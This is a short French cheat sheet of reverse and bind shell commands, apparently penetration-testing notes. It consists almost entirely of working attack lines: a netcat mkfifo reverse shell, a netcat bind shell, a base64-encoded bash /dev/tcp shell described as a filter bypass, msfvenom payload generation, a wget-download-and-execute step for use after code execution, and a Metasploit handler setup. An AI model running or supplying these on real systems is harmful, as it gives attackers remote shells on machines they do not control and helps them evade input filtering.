# Shells

> Exemples de différents types de reverse shells

### 1. Reverse shell Netcat OpenBSD

- Machine cible : 

  ```bash
  $ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
  ```

- Hôte :

  ```bash
  $ nc -lvp 4242
  ```

### 2. Bind shell

```bash
$target nc -e /bin/sh -lvp 3333
$host nc <ip_target> 3333
```

### 3. Reverse shell sans caractère spéciaux (bypass filter)

```bash
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
$ echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xNi80NDQ0IDA+JjEnCg== | base64 -d | bash 2>/dev/null
```

### 4. Générateur de reverse shells

- https://www.revshells.com/

### 5. Reverse shell meterpreter:

```bash
# A générer selon l'architecture ciblée
# Génération du reverse shell binaire 
$ msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP_HOTE> LPORT=<PORT_HOTE> -f elf

# Envoi du fichier et lancement en background (diffère selon la RCE)
`wget http://<IP_HOTE:PORT_HOTE>/rev -O /tmp/rev|chmod +x /tmp/rev|/tmp/rev &`

# Lancement d'un multi-handler pour recevoir la connexion
$ msfconsole -q
msf6> use exploit/multi/handler
msf6> set payload linux/x64/shell/reverse_tcp # Bien mettre le même payload que celui généré via msfvenom !!!
msf6> set LHOST <IP_HOTE>
msf6> set LPORT <PORT_HOTE>
msf6> exploit
```

